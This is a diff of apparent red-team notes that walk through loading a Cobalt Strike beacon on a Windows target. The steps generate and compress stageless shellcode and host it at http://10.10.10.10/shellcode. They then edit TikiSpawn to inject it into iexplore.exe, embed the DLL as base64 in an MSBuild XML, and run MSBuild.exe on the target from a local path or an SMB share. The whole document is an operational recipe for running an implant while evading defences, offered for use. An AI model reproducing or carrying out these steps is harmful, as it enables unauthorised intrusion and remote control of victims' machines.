@@ -1,32 +1,35 @@
-# These instructions explain how to execute a beacon using MSBuild and TikiSpawn
+# These instructions explain how to execute a CS Beacon using MSBuild and TikiSpawn
 # Link: https://rastamouse.me/2019/06/tikispawn-msbuild/
 
-Generate Coblat Strike Stageless Payload in Raw (.bin) format
-Compress shellcode using the following Powershell script
-  https://github.com/rasta-mouse/TikiTorch/blob/master/Get-CompressedShellcode.ps1
-  Syntax: Get-CompressedShellcode -inFile "beacon.bin" >> shellcode.txt
-Host shellcode.txt using Cobalt Strike with a URI of /shellcode
+#GENERATE PAYLOAD
+- Generate Coblat Strike Stageless Payload in Raw (.bin) format
+- Compress shellcode using the following Powershell script
+    https://github.com/rasta-mouse/TikiTorch/blob/master/Get-CompressedShellcode.ps1
+    Syntax: Get-CompressedShellcode -inFile "beacon.bin" >> shellcode.txt
+- Host shellcode.txt using Cobalt Strike with a URI of /shellcode (URI can be anything)
 
-Download TikiTorch: https://github.com/rasta-mouse/TikiTorch
-Edit the following file: TikiTorch/TikiSpawn/Program.cs
-  Flame(@"C:\Program Files\Internet Explorer\iexplore.exe", @"http://10.10.10.10/shellcode"); 
-Compile TikiTorch using .Net Framework by clicking on the TikiTorch.sln file
-  If errors are encountered while compiling you may need to install additional NuGet packages
-    In .Net Framework select Project -> Manage NuGet Packages
-  We will be using the Tikispawn.dll file for future steps
-  
-Convert TikiSpawn.dll to Base64
-  [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("TikiSpawn.dll"))
-  
-Add Base64 to the following TikiSpawn.xml File at (public const string Dll = "TVqQ[...snip...]AAA=";)
-  XML Template: https://rastamouse.me/2019/06/tikispawn-msbuild/
-  
-Option: You can either host file over SMB or copy the XML to the target to execute
+#COMPILE TIKISPAWN
+- Download TikiTorch: https://github.com/rasta-mouse/TikiTorch
+- Edit the following file: TikiTorch/TikiSpawn/Program.cs
+    Flame(@"C:\Program Files\Internet Explorer\iexplore.exe", @"http://10.10.10.10/shellcode"); 
+- Compile TikiTorch using .Net Framework by clicking on the TikiTorch.sln file
+    If errors are encountered while compiling you may need to install additional NuGet packages
+      In .Net Framework select Project -> Manage NuGet Packages
+- We will only be using the Tikispawn.dll file from the TikiTorch package
 
-Two options to call XML; Remote and Local. Both options will pull the shellcode from the Cobal web server
-Remote:
-  On the target run C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\share\TikiSpawn.xml
-    There may be errors when executing MSBuild but the beacons may still work
-Local:
-  Copy TikiSpawn.xml to target
-  On the target run C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe C:\Path\TikiSpawn.xml
+#CREATE/HOST XML FILE
+- Convert TikiSpawn.dll to Base64
+    Powershell: [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("TikiSpawn.dll"))
+- Add Base64 to the following TikiSpawn.xml File at (public const string Dll = "TVqQ[...snip...]AAA=";)
+    XML Template: https://rastamouse.me/2019/06/tikispawn-msbuild/
+- Option: You can either host file over SMB or copy the XML to the target to execute
+
+#EXECUTE ON TARGET
+- Two options to call XML; Remote and Local. Both options will pull the shellcode from the Cobal web server
+  Remote:
+    Execute C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\share\TikiSpawn.xml
+  Local:
+    Copy TikiSpawn.xml to target
+    Execute C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe C:\Path\TikiSpawn.xml
+
+  There may be erros but it still works.
